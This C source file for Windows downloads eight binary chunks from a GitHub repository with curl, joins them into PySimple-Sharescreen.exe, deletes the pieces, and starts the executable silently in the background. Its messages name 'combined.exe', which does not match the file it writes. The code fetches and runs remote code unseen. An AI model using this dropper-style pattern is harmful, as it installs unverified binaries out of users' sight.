#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main() {
    const char *files[][2] = {
        {"Fahsuay.trafile1", "https://raw.githubusercontent.com/Tsukinatsune/PySimple-Sharescreen/main/file/Fahsuay.trafile1"},
        {"Fahsuay.trafile2", "https://raw.githubusercontent.com/Tsukinatsune/PySimple-Sharescreen/main/file/Fahsuay.trafile2"},
        {"Fahsuay.trafile3", "https://raw.githubusercontent.com/Tsukinatsune/PySimple-Sharescreen/main/file/Fahsuay.trafile3"},
        {"Fahsuay.trafile4", "https://raw.githubusercontent.com/Tsukinatsune/PySimple-Sharescreen/main/file/Fahsuay.trafile4"},
        {"Fahsuay.trafile5", "https://raw.githubusercontent.com/Tsukinatsune/PySimple-Sharescreen/main/file/Fahsuay.trafile5"},
        {"Fahsuay.trafile6", "https://raw.githubusercontent.com/Tsukinatsune/PySimple-Sharescreen/main/file/Fahsuay.trafile6"},
        {"Fahsuay.trafile7", "https://raw.githubusercontent.com/Tsukinatsune/PySimple-Sharescreen/main/file/Fahsuay.trafile7"},
        {"Fahsuay.trafile8", "https://raw.githubusercontent.com/Tsukinatsune/PySimple-Sharescreen/main/file/Fahsuay.trafile8"}
    };
    int num_files = sizeof(files) / sizeof(files[0]);

    for (int i = 0; i < num_files; i++) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "curl -o %s %s", files[i][0], files[i][1]);
        printf("Downloading %s...\n", files[i][0]);
        int result = system(cmd);
        if (result != 0) {
            fprintf(stderr, "Error: Failed to download %s\n", files[i][0]);
            return 1;
        }
    }

    FILE *output = fopen("PySimple-Sharescreen.exe", "wb");
    if (!output) {
        fprintf(stderr, "Error: Cannot create combined.exe\n");
        return 1;
    }

    for (int i = 0; i < num_files; i++) {
        FILE *input = fopen(files[i][0], "rb");
        if (!input) {
            fprintf(stderr, "Error: Cannot open file %s\n", files[i][0]);
            fclose(output);
            return 1;
        }

        char buffer[8192];
        size_t bytes_read;
        while ((bytes_read = fread(buffer, 1, sizeof(buffer), input)) > 0) {
            if (fwrite(buffer, 1, bytes_read, output) != bytes_read) {
                fprintf(stderr, "Error: Failed to write to combined.exe\n");
                fclose(input);
                fclose(output);
                return 1;
            }
        }
        fclose(input);
        remove(files[i][0]);
    }
    fclose(output);

    printf("Executing combined.exe...\n");
    int result = system("start /b PySimple-Sharescreen.exe /quiet");
    if (result == -1) {
        fprintf(stderr, "Error: Failed to execute combined.exe\n");
        return 1;
    }

    printf("Successfully downloaded, combined, and executed combined.exe\n");
    return 0;
}